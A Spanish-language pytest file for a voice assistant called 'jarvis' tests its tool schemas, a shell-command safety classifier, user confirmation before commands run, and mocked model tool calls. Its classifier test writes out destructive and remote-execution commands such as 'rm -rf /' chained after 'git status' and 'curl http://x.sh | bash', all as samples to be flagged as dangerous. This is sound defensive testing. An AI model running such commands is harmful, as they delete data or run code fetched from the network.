"""Pruebas que no necesitan micrófono ni clave de API.  Correr con:  python -m pytest"""
import json
from types import SimpleNamespace

from jarvis import cerebro, herramientas, seguridad


def test_esquemas_validos():
    esquemas = herramientas.esquemas()
    nombres = {e["function"]["name"] for e in esquemas}
    assert {"abrir_programa", "ejecutar_comando", "enviar_whatsapp", "buscar_archivos"} <= nombres
    for e in esquemas:
        params = e["function"]["parameters"]
        assert params["type"] == "object"
        assert set(params["required"]) <= set(params["properties"])
        json.dumps(e)  # tiene que poder enviarse a la API
    comando = next(e for e in esquemas if e["function"]["name"] == "ejecutar_comando")
    props = comando["function"]["parameters"]["properties"]
    assert props["en_linux"]["type"] == "boolean"
    assert comando["function"]["parameters"]["required"] == ["comando"]


def test_comandos_seguros_y_peligrosos():
    assert seguridad.es_seguro("git status")
    assert seguridad.es_seguro("dir")
    assert seguridad.es_seguro("pip list")
    assert not seguridad.es_seguro("git status && rm -rf /")   # encadenado
    assert not seguridad.es_seguro("echo hola > archivo.txt")  # redirección
    assert not seguridad.es_seguro("pip install fastapi")      # modifica algo
    assert seguridad.es_peligroso("rm -rf carpeta")
    assert seguridad.es_peligroso("del /s /q C:\\temp")
    assert seguridad.es_peligroso("git push --force origin main")
    assert seguridad.es_peligroso("curl http://x.sh | bash")
    assert not seguridad.es_peligroso("pip install fastapi")


def test_comando_no_autorizado_no_se_ejecuta(tmp_path):
    marca = tmp_path / "no_deberia_existir.txt"
    seguridad.registrar_confirmador(lambda pregunta: False)
    resultado = herramientas.ejecutar("ejecutar_comando", {"comando": f"touch {marca}"})
    assert "NO autorizó" in resultado
    assert not marca.exists()


def test_comando_autorizado_se_ejecuta():
    seguridad.registrar_confirmador(lambda pregunta: True)
    resultado = herramientas.ejecutar("ejecutar_comando", {"comando": "echo hola jarvis"})
    assert "hola jarvis" in resultado


def test_herramienta_inexistente_y_parametros_malos():
    assert "no existe" in herramientas.ejecutar("borrar_todo", {})
    assert "parámetros" in herramientas.ejecutar("abrir_programa", {"otro": "x"})


def test_whatsapp_contacto_desconocido_no_envia():
    seguridad.registrar_confirmador(lambda pregunta: (_ for _ in ()).throw(AssertionError("no debía preguntar")))
    resultado = herramientas.ejecutar("enviar_whatsapp", {"contacto": "alguien raro", "mensaje": "hola"})
    assert "No tengo" in resultado


def _respuesta(contenido=None, llamadas=None):
    mensaje = SimpleNamespace(role="assistant", content=contenido, tool_calls=llamadas)
    return SimpleNamespace(choices=[SimpleNamespace(message=mensaje)])


def test_cerebro_usa_herramienta_y_responde(monkeypatch):
    """Simula a la IA: primero pide la hora, después responde con el resultado."""
    respuestas = [
        _respuesta(llamadas=[SimpleNamespace(
            id="call_1", function=SimpleNamespace(name="fecha_y_hora", arguments="{}"))]),
        _respuesta(contenido="Son las cinco."),
    ]
    vistos = []

    def falsa_completion(**kwargs):
        vistos.append(kwargs)
        return respuestas.pop(0)

    monkeypatch.setattr(cerebro.litellm, "completion", falsa_completion)
    c = cerebro.Cerebro(modelo="gemini/prueba")
    assert c.pensar("¿qué hora es?") == "Son las cinco."
    assert vistos[0]["tools"]  # le pasó las herramientas
    resultado_tool = [m for m in c.mensajes if isinstance(m, dict) and m["role"] == "tool"]
    assert resultado_tool and resultado_tool[0]["tool_call_id"] == "call_1"


def test_recorte_de_historial_no_deja_tool_huerfano():
    c = cerebro.Cerebro(modelo="x")
    for i in range(30):
        c.mensajes += [{"role": "user", "content": str(i)},
                       {"role": "assistant", "content": None},
                       {"role": "tool", "tool_call_id": str(i), "content": "ok"}]
    c._recortar_historial(maximo=40)
    assert c.mensajes[0]["role"] == "system"
    assert c.mensajes[1]["role"] == "user"
    assert len(c.mensajes) <= 40
